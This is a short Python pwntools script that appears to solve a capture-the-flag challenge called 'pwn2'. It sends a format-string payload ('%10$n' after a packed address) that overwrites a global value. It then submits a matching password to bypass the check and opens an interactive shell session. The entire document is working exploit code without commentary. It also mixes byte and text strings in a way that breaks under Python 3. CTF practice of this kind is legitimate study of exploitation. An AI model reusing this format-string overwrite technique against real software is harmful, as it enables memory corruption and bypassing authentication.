from pwn import *
p = process('./pwn2')
leak_addr = 0x804C044
p.recvuntil('your name:')
payload1 = p32(leak_addr) + '%10$n'
p.sendline(payload1)
p.recvuntil('your passwd:')
p.sendline(b'4')
p.interactive()